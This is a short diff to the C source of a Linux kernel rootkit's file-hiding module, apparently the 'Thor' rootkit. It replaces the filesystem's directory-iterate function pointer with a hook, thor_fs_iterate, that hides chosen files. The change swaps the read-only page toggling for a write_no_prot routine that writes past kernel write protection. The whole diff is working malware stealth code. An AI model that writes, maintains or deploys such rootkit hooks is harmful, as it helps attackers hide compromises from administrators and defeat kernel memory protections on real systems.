@@ -43,6 +43,7 @@ static int (*orig_fs_filldir)(void *buf, const char *name, int namelen,
 int filehider_init(void)
 {
     struct file *filep_etc;
+    void *iterate_addr;
 
     filep_etc = filp_open("/etc", O_RDONLY, 0);
     if (filep_etc == NULL) {
@@ -58,13 +59,13 @@ int filehider_init(void)
 #else
     orig_fs_iterate = fs_fops->iterate;
 #endif
-    set_addr_rw(fs_fops);
+
+    iterate_addr = (void*) &thor_fs_iterate;
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
-    fs_fops->readdir = thor_fs_iterate;
+    write_no_prot(&fs_fops->readdir, &iterate_addr, sizeof(void*));
 #else
-    fs_fops->iterate = thor_fs_iterate;
+    write_no_prot(&fs_fops->iterate, &iterate_addr, sizeof(void*));
 #endif
-    set_addr_ro(fs_fops);
 
     INIT_LIST_HEAD(&file_list.list);
 
@@ -156,13 +157,12 @@ void clear_file_list(void)
 void filehider_cleanup(void)
 {
     if (fs_fops != NULL && orig_fs_iterate != NULL) {
-        set_addr_rw(fs_fops);
+        void *iterate_addr = orig_fs_iterate;
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
-        fs_fops->readdir = orig_fs_iterate;
+        write_no_prot(&fs_fops->readdir, &iterate_addr, sizeof(void*));
 #else
-        fs_fops->iterate = orig_fs_iterate;
+        write_no_prot(&fs_fops->iterate, &iterate_addr, sizeof(void*));
 #endif
-        set_addr_ro(fs_fops);
     }
 
     clear_file_list();
